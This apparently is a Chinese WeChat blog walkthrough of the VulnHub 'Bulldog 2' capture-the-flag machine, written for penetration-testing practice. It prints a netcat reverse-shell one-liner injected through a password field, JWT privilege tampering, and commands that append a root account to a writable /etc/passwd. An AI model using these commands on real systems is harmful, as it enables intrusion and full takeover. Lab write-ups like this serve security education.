> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6uzRdCuvszJx45xna4ACkg)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **50** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/5ria5WVLahGj8W7vu6J2jzTGqRtEaL6ib9CDzENq8PCEZADfU3JXsmibNacJhY7rooNoYIpCsUytNS0k4UcSsnRfw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/bulldog-2,246/

靶机难度：中级（CTF）

靶机发布日期：2018 年 7 月 18 日

靶机描述：

自 Bulldog Industries 遭受数次数据泄露以来已经过去了三年。在那时，他们已经恢复并重新命名为 Bulldog.social，这是一家新兴的社交媒体公司。您可以接受这一新挑战并在他们的生产 Web 服务器上扎根吗？

这是标准的启动到根。您唯一的目标是进入根目录并查看祝贺消息，该如何操作取决于您！

难度：中级，有些事情您可能从未见过。仔细考虑所有问题:)

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/XxZOJAn437TAwOeYFBI2JiamRa34iaqY1IAPG9MaXSIKgPlBicRoyoyHPr0q6YUAhLTYebc4z2qjok0r1riadSujeg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6DdW6admPmWicucEOicwONQBeMWRA7Pq57A9xCTGbIWomiboqObS0bEetoo2qW2hHk2E5GOcuQYUqSlQT5BKsDqRQ/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/M39rvicGKTibrmYlY2VW5XChia77yhteBC7iarNdYSwicq64NZrCHeSZqRpsFRTZkpfgclSWaibqftONNMWLkz6QjyoQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUYaDTddqe2Us8ZDrjlBMxZ5dzlyOFOtLeHOvhj6YKib17EIr1M1EaP3g/640?wx_fmt=png)

直接看到了 IP：192.168.56.141   我就直接 nmap 了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUibORnRrhzB0DPBS9NJs5Xknec29H1B07TdSrqjRibFEANzc414oHHDLw/640?wx_fmt=png)

只开了 80 端口...65534 是 filtered...（好像以前做过类似的）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUnWecPjkh1JV8MkxvCQpHeNxbWj7N93TvrByoJccibzeBkeKt54jicb4g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOU6rt6UmVlIxNNeQeKTcvbvsJvbul6PCQCyawSElOFMmfunRvYuhkibow/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOU9hmrfb56Sl1b8w2HZHmmic7D4mKwTDsrc8ETFOmjVxKrI5qNucpO5Lw/640?wx_fmt=png)

有登录页面...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUB9GXOAds8oia4qluBpDB8UIkQkzHRIOfdiatWmtbzVVCXicLLyWiciaftWg/640?wx_fmt=png)

安全原因，不允许注册...

上面测试了普通账号密码无法登录...

dirb 和 nikto 也没发现什么有用的... 继续浏览

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOU47cM7JTpiaoFibFPicLu1vt59GNMG27ErIlj8xEKoFA3EcdxPymtFYKjw/640?wx_fmt=png)

点击进入 user，发现这里面网站上每月使用量最高的用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUCc4rgmVvqopaOdRGkicVNEibV0nmrAh7AEr5llArNlSWkibQrzDlNibR5Q/640?wx_fmt=png)

前段源码发现很多 js 文件... 一个一个查看得眼花，我还是对 login 页面进行分析吧...

前面看到无法注册用户，我使用 burp suite 来分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUiaVR2wnYmlqBCwL32cYpRr9h2iaCBrnHVeibo6waOsniaV5HX9uTGlTBfg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUaLkvqyAmnyvpiaJib2QQdpJZiaxhR3v8tB2sxviaPRNBlwS2RVGS9iaV8Ig/640?wx_fmt=png)

这边抓到了服务器提交请求的数据...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOU5VTMgbLhdo3WrVYv4QsFVzqnvmTCwfGWrljv8qcq9ehb7KXm4K7YrA/640?wx_fmt=png)

发现加了 name 和 email 后还是不行...

发现这里是 authenticate，我改成注册的 register...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUnb68jHiat4ezxwsRlAcUeictTgIzCibYMrrE1OwqMJ0LGb28ibxts2ga9A/640?wx_fmt=png)

还真成功了... 说明可以注册的，登录看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUYlBkzZj5WD9tf1l0r3wK79Can9ibkEvBxHYvZdsKaDvEIAXW9iad5IMQ/640?wx_fmt=png)

我又注册了 dayutest 测试看看是否可以水平越权渗透...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUZib7ibjQbCnLuvXE2qicx3ygEhbxvCiaUFlLOXMicqySDbficJzHNIn85jMg/640?wx_fmt=png)

发现只要是存在的用户，在链接中直接修改用户名，即可直接访问进去不需要密码... 但是这没什么用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUK9GAVIvLtxqw8EU0ViciaHVg6ay0Blibhv9D7s1nf8YbYasWGDYTxnjnA/640?wx_fmt=png)

再次登录界面登录 dayu 用户重新抓包，查看到服务器回包信息...

```
{"success":true,"token":"JWT....百度JWT：JSON Web Token（JWT）
```

是一个非常轻巧的规范。这个规范允许我们使用 JWT 在用户和服务器之间传递安全可靠的信息....  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOU06148GAT0YYq4Ver0ksPTrxt1nreckh2jlY8oto4UNzHCicmEeOKItA/640?wx_fmt=png)

这边知道了 jwt 的信息在下面... 分析下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOU2nQYt05vdZnmD2Lwvcb4fX2rE0ZCudAL32Tr5YibbRApNwQBOl9FRNw/640?wx_fmt=png)

可以看到有个 auth_level 的参数跟着 standard_user，类似权限的意思... 前面 JS 文件我记得有很多类似的信息... 回去找下

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUsRJoJ72vv8BiaYuEYhJsW0gpNG5mIJsPaMktHMrKicpSZibDhLI5qibWKw/640?wx_fmt=png)

查看此文件的内容后，发现 master_admin_user 具有最高的 auth_level...

![](https://mmbiz.qpic.cn/mmbiz_png/6DdW6admPmWicucEOicwONQBeMWRA7Pq57A9xCTGbIWomiboqObS0bEetoo2qW2hHk2E5GOcuQYUqSlQT5BKsDqRQ/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/M39rvicGKTibrmYlY2VW5XChia77yhteBC7iarNdYSwicq64NZrCHeSZqRpsFRTZkpfgclSWaibqftONNMWLkz6QjyoQ/640?wx_fmt=png)

重新抓包...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUXn73C5lEvia8YianqicLia5ThHkMIZRkKO8z3wNMk2PZ8henY8BggRXkNA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUvpnHqfQtDgiakLib2fxiaaichunHBf5R3AuwI2MESPpkbzER0SLOFUdXgA/640?wx_fmt=png)

这里重新抓包后，读取到用户名密码后将数据包发送到 Response to this request，然后 Forward 即可出现 JWT 值....

将 standard_user 改成 master_admin_user 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUv0rcRMprBnfcMVzeZkpnvL6iaqlLbukYG4QoEFZVJCk1V4bI8RBGqPA/640?wx_fmt=png)

可以看到 yujun 获得了 admin 权限...（垂直渗透成功）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUnzcicGwIqujqtnia4M1PWV7BlrUr7DRBUaSicNbibZX3v4k6pMQEFdd3Gg/640?wx_fmt=png)

发现可以输入账号密码，继续分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOU3Za9rBVKpEX85AbGBpJB2YZ67nvNP92IPpWZFyBzuOUXo0oWFIBFQA/640?wx_fmt=png)

继续分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUXAatW8ofJeM9Y6Yrib3ZtnYXUk2n0iayyDMg9CXpw9Z7pXREyJZHJU7Q/640?wx_fmt=png)

发送后发现，返回的是 200 OK 成功了，但是是错误的密码 false... 说明存在命令执行漏洞...

那就在密码处输入 shell 即可... 试试...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUeZchgeY1dv27ic2r3Ps7qYDbIBBjTaicOA2cUPVaALLiaVfI0ghws3yjg/640?wx_fmt=png)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.103 4444 >/tmp/f;   （上一张才刚用过此命令提权，嘿嘿）
```

成功获得低权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOU0fGflaUKlafdDSepZEZgaK4KrxeZ4sOu4Lian8PoyR1FrG4bO6ryGYQ/640?wx_fmt=png)

```
;ping 192.168.56.103 -c 4
tcpdump -nni eth0 icmp
```

当利用 ping 测试账号的时候，无 ICMP 数据包返回，测试密码的时候，返回了 ICMP 数据包... 说明密码区域可以执行反向 shell...

然后注入个 payload 即可提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOU3f956ZZ8fcymQLKfSLyD16XPXVuaErXy1Q5W9xPaUPQpCQLnjK8Gibw/640?wx_fmt=png)

查看 passwd，权限为 777...

这里直接创建个 root 用户即可.... 前面章节也有遇到过类似的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOLtNMHTsouVs7SNv6riaibOUu6LIL6DbwDNzZQQfadDuwXLYnAXJI24iaOMhINMibREwmlOxmicicooR6w/640?wx_fmt=png)

```
perl -le 'print crypt("dayu","aa")'
echo 'dayuroot:aaP.3CTQfJaLg:0:0:dayuroot:/root:/bin/bash' >>/etc/passwd
```

可以看到写入了 dayuroot 用户，成功登陆后获得 roo 权限...

![](https://mmbiz.qpic.cn/mmbiz_png/5ria5WVLahGj8W7vu6J2jzTGqRtEaL6ib9CDzENq8PCEZADfU3JXsmibNacJhY7rooNoYIpCsUytNS0k4UcSsnRfw/640?wx_fmt=png)

这里使用 openssl passwd -1 -salt user3/infosec （passwd) 可以生成哈希值，进行登陆...

这里熟悉命令注入攻击提权后就简单了....

由于我们已经成功得到 root 权限查看 flag，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/XxZOJAn437TAwOeYFBI2JiamRa34iaqY1IAPG9MaXSIKgPlBicRoyoyHPr0q6YUAhLTYebc4z2qjok0r1riadSujeg/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)